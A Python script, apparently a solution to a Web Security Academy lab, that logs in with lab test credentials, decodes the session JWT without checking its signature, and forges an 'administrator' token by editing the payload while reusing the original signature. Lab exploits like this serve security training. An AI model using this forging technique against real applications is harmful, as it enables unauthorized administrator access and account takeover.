import jwt
import base64
import requests
from bs4 import BeautifulSoup

# Login & Get JWT Token

session = requests.Session()

url = "https://0ac3002303e67733841b1def002b0092.web-security-academy.net/login"
response = session.get(url)

soup = BeautifulSoup(response.text, 'html.parser')
csrf_token = soup.find("input", {"name": "csrf"})["value"]

data = {
    "csrf": csrf_token,  
    "username": "wiener",
    "password": "peter"
}

response = session.post(url, data=data)

cookies = session.cookies.get_dict()
token = cookies.get("session")  
print(f"JWT Token: {token}")

# Payload

payload = jwt.decode(token, options={"verify_signature": False})
print(f"\nDecode token: {payload}\n")

header, payload, signature = token.split('.')
decoded_payload = base64.urlsafe_b64decode(payload + '=' * (-len(payload) % 4))
modified_payload = decoded_payload.replace(b'wiener', b'administrator')

modified_payload_b64 = base64.urlsafe_b64encode(modified_payload).rstrip(b'=').decode()
modified_token = f"{header}.{modified_payload_b64}.{signature}"
print(f"Modifiled token: {modified_token}")